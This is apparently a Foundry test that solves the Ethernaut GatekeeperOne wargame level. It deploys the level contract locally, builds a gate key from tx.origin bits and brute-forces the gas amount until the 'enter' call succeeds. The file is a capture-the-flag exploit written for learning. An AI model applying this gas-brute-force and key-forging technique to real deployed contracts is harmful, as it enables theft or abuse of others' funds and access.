//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {GatekeeperOne} from "../src/level14.sol";
import {Test, console} from "forge-std/Test.sol";

contract GateKeeperOneTest is Test {
    GatekeeperOne public gatekeeperOne;
    address public attacker = makeAddr("attacker");
    address public player = makeAddr("player");
    bytes8 public gateKey;

    function setUp() public {
        vm.deal(attacker, 100 ether);
        vm.deal(player, 100 ether);
        vm.startPrank(player); //player is an tx.origin of the transaction
        gatekeeperOne = new GatekeeperOne();
        vm.stopPrank();
    }

    function test_attack() public {
        vm.startPrank(attacker);
        // first gate is passed by using tx.origin
        // second gate is passed by using gasleft() % 8191 == 0
        // third gate is passed by using bytes8(0xABCCDDEE00000000) |uint64( uint16(uint160(tx.origin)))
        uint16 _origin16 = uint16(uint160(tx.origin));
        uint64 _origin64 = uint64(0xABCDEFAB00000000) | uint64(_origin16); // third case is passed and first also
        gateKey = bytes8(_origin64);
        // console.log("gateKey", gateKey);
        for (uint256 i = 0; i < 8191; i++) {
            (bool success, ) = address(gatekeeperOne).call{
                gas: i * 8191 + 200 + 8191
            }(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if (success) {
                console.log("i value", i);
                console.log("gasleft", gasleft());
                string memory str = string(abi.encodePacked(gateKey));
                console.log("gateKey", str);

                break;
            }
        }

        vm.stopPrank();
    }
}
